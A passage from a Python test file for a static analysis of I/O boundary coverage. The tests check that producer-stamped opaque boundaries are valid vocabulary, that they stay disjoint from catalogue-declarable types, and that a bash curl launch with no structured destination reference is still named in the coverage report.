        assert coverage.complete is True, (
            f"a stamp naming a KNOWN surface is an examined negative exactly as "
            f"a catalogued row is; got: {coverage.reason!r}"
        )

    def test_the_producer_channel_is_real_vocabulary_and_not_catalogue_declarable(
        self,
    ) -> None:
        """The mirror of ``test_the_opaque_set_is_declarable_by_a_catalogue``,
        and it has to be the mirror rather than the same test.

        A catalogue-declarable opaque boundary is inert unless it is in
        ``CATALOG_BOUNDARY_TYPES``; a PRODUCER-stamped one is inert if it is,
        because ``_parse_catalog`` iterates exactly that tuple and would then be
        the channel that carries it. The two sets answer one question through
        two channels and must stay disjoint. Membership in
        ``KNOWN_IO_BOUNDARIES`` is the anti-typo check: an unvalidated boundary
        string is how INV-todas confirmed a claim on a misspelling.
        """
        assert PRODUCER_OPAQUE_BOUNDARIES <= KNOWN_IO_BOUNDARIES, (
            f"not io-boundary vocabulary at all: "
            f"{sorted(PRODUCER_OPAQUE_BOUNDARIES - KNOWN_IO_BOUNDARIES)}"
        )
        assert not (PRODUCER_OPAQUE_BOUNDARIES & set(CATALOG_BOUNDARY_TYPES)), (
            f"a catalogue CAN declare "
            f"{sorted(PRODUCER_OPAQUE_BOUNDARIES & set(CATALOG_BOUNDARY_TYPES))}, "
            f"so it belongs in OPAQUE_BOUNDARIES where declares_opaque_crossing "
            f"asks every row — not in the producer set"
        )

    def test_a_launch_without_a_structured_dst_ref_is_still_named(
        self, tmp_path: Path,
    ) -> None:
        """The slot fallback in ``_launch_site_name``, exercised rather than
        pragma'd.

        Only bash stamps a boundary today and it always sets ``dst_ref``, so
        this shape is not in the corpus — but the stamp is a PRODUCER CONTRACT,
        and the next producer to adopt it may satisfy the contract without a
        structured ref. A launch that cannot be named would otherwise be
        silently dropped from the disclosure, which is the failure this whole
        module is about: the gap that reports nothing.
        """
        edge = {k: v for k, v in BASH_CURL_LAUNCH_EDGES[0].items()
                if k != "dst_ref"}
        catalog = _bash_catalog(tmp_path, _BASH_NET_SEND_ONLY)
        coverage = compute_boundary_coverage([edge], {"bash"}, {"bash": catalog})
        assert coverage.complete is False, coverage.reason
        assert "curl.curl" in coverage.reason, (
            f"the slot fallback must spell the site exactly as the dst_ref "
            f"branch does, or one disclosure reads differently from the other; "
            f"got: {coverage.reason!r}"
        )
